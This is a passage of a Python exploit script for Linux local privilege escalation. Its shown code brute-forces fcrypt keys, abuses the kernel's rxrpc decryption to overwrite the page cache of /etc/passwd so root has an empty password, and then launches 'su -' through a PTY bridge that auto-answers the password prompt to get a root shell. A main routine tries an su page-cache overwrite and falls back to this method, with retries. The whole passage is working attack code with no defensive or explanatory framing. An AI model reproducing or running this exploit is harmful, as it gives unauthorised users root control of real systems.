    write_file("/proc/self/gid_map", f"0 {gid} 1")
    # Bring up lo
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.ioctl(socket.SIOCGIFFLAGS, struct.pack("16si", b"lo", 0x1|0x40))
    s.close()

    # Force-load rxrpc module
    try:
        dummy = socket.socket(socket.AF_RXRPC, socket.SOCK_DGRAM, 0)
        dummy.close()
    except:
        pass

    # Open /etc/passwd and mmap
    fd = os.open("/etc/passwd", os.O_RDONLY)
    m = mmap.mmap(fd, 0, prot=mmap.PROT_READ, flags=mmap.MAP_SHARED)
    Ca = m[4:12]; Cb_orig = m[6:14]; Cc_orig = m[8:16]

    # Predicates
    def pred_a(P): return P[0]==0x3A and P[1]==0x3A
    def pred_b(P): return P[0]==0x30 and P[1]==0x3A
    def pred_c(P):
        if P[0]!=0x30 or P[1]!=0x3A or P[7]!=0x3A: return False
        for i in range(2,7):
            if P[i] in (0x3A,0x00,0x0A): return False
        return True

    seed_base = int(time.time()) ^ (os.getpid() << 32)
    max_iters = int(os.environ.get("LPE_MAX_ITERS", 10000000000))

    # Offline brute-force
    def find_key(C, check, seed, label):
        sched = None
        for it in range(max_iters):
            r = (seed + 0x9E3779B97F4A7C15) & 0xFFFFFFFFFFFFFFFF
            seed = r
            r = (r ^ (r >> 30)) * 0xBF58476D1CE4E5B9 & 0xFFFFFFFFFFFFFFFF
            r = (r ^ (r >> 27)) * 0x94D049BB133111EB & 0xFFFFFFFFFFFFFFFF
            key = (r ^ (r >> 31)).to_bytes(8, 'little')
            sched = fcrypt_setkey(key)
            P = fcrypt_decrypt_block(sched, C)
            if check(P):
                return key, P
            if it % (1<<26) == 0 and it > 0:
                print(f"  [{label}] iter={it}...")
        return None, None

    Ka, Pa = find_key(Ca, pred_a, seed_base, "K_A")
    if Ka is None: return False
    Cb_actual = Pa[2:8] + Cb_orig[6:8]
    Kb, Pb = find_key(Cb_actual, pred_b, seed_base ^ 0xa5a5a5a5a5a5a5a5, "K_B")
    if Kb is None: return False
    Cc_actual = Pb[2:8] + Cc_orig[6:8]
    Kc, Pc = find_key(Cc_actual, pred_c, seed_base ^ 0x5a5a5a5a5a5a5a5a, "K_C")
    if Kc is None: return False

    # Trigger kernel decryption (order: A, B, C)
    if not do_rxrpc_trigger(fd, 4, Ka, 0):
        return False
    time.sleep(0.1)
    if not do_rxrpc_trigger(fd, 6, Kb, 1):
        return False
    time.sleep(0.1)
    if not do_rxrpc_trigger(fd, 8, Kc, 2):
        return False

    # Verify
    m.seek(0)
    line = m.read(32)
    if line[4:6] == b"::" and line[6:8] == b"0:" and line[8:10] == b"0:" and line[15:16] == b":":
        print("[+] /etc/passwd patched (root::0:0...)")
        return True
    return False

# ==================== PTY bridge for su - ====================
def spawn_root_shell():
    master, slave = pty.openpty()
    pid = os.fork()
    if pid == 0:
        os.setsid()
        os.close(master)
        os.dup2(slave, 0); os.dup2(slave, 1); os.dup2(slave, 2)
        os.close(slave)
        for su in ["/usr/bin/su", "/bin/su", "/sbin/su"]:
            try: os.execv(su, ["su", "-"])
            except: pass
        os._exit(1)

    signal.signal(signal.SIGTTOU, signal.SIG_IGN)
    signal.signal(signal.SIGTTIN, signal.SIG_IGN)
    os.setpgid(0, 0)
    old = termios.tcgetattr(sys.stdin.fileno())
    new = old[:]
    new[3] &= ~(termios.ECHO | termios.ICANON | termios.ISIG)
    termios.tcsetattr(sys.stdin.fileno(), termios.TCSANOW, new)
    auto_pw = False
    stdin_eof = False
    try:
        while True:
            r, _, _ = select.select([sys.stdin] if not stdin_eof else [], [master], [master], 0.2)
            for fd in r:
                if fd == sys.stdin:
                    data = os.read(sys.stdin.fileno(), 4096)
                    if not data:
                        stdin_eof = True
                    else:
                        os.write(master, data)
                elif fd == master:
                    data = os.read(master, 4096)
                    if not data: break
                    os.write(sys.stdout.fileno(), data)
                    if not auto_pw and b"Password" in data:
                        os.write(master, b"\n")
                        auto_pw = True
            wpid, _ = os.waitpid(pid, os.WNOHANG)
            if wpid == pid:
                time.sleep(0.1)
                while True:
                    try: data = os.read(master, 4096)
                    except: break
                    if not data: break
                    os.write(sys.stdout.fileno(), data)
                break
    finally:
        termios.tcsetattr(sys.stdin.fileno(), termios.TCSANOW, old)
        os.close(master)

# ==================== Main chain ====================
def main():
    if os.getuid() == 0:
        os.execv("/bin/bash", ["bash"])
    print("[*] Trying su page-cache overwrite...")
    if su_lpe_main():
        print("[+] su patched, launching root shell...")
        spawn_root_shell()
        return
    print("[*] Falling back to rxrpc /etc/passwd corruption...")
    for attempt in range(4):
        if rxrpc_lpe_main():
            print("[+] /etc/passwd patched, spawning root shell via su...")
            spawn_root_shell()
            return
        print(f"[!] Attempt {attempt+1} failed, retrying...")
        time.sleep(1)
    print("[-] Exploit failed.")
    sys.exit(1)

if __name__ == "__main__":
    main()
